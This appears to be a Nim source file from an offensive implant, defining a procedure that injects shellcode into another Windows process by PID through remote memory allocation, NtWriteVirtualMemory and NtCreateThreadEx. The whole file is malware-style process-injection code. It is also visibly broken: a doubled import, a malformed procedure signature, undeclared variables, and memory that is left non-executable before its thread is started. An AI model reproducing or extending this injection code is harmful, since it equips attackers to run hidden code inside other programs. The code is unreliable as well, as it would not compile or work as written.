import winim
import import os, json, strformat, strutils
import utils, comms, config, syscalls

proc ProcessInjection_shellcode(pid: DWORD,cmd : string): = string 
    #since the string is store asbytes under the hood we can just write it to memory
    oldProtect: DWORD
    RegionSize: PSIZE_T
    memory_handle: LPVOID
    thread_ID: LPDWORD
    var cmd_stub:  LPVOID = VirtualAlloc(NULL,cast[SIZE_T](cmd.len),(MEM_RESERVE | MEM_COMMIT),PAGE_READWRITE)
    copyMem(cmd_stub,addr cmd[0],cmd.len)
    discard VirtualProtect(cmd_stub,cast[SIZE_T](cmd.len),PAGE_EXECUTE_READ,addr oldProtect)
    process_handle: HANDLE = OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ or PROCESS_QUERY_INFORMATION,false,pid)
    discard NtAllocateVirtualMemory(process_handle,memory_handle,NULL,addr RegionSize,(MEM_RESERVE | MEM_COMMIT),PAGE_READWRITE)
    discard NtWriteVirtualMemory(process_handle,memory_handle,cmd_stub,cast[SIZE_T](cmd.len),NULL)
    thread_handle: HANDLE = NtCreateThreadEx(process_handle,NULL,0,cast[LPTHREAD_START_ROUTINE](memory_handle),NULL,0,0,addr thread_ID) #have a play here with thread suspend and resume

    if (thread_handle == nil):
        echo "Thread Didnt run due to some error"
    
    WaitForSingleObject(thread_handle,INFINITE)
    CloseHandle(process_handle)
    CloseHandle(thread_handle)
    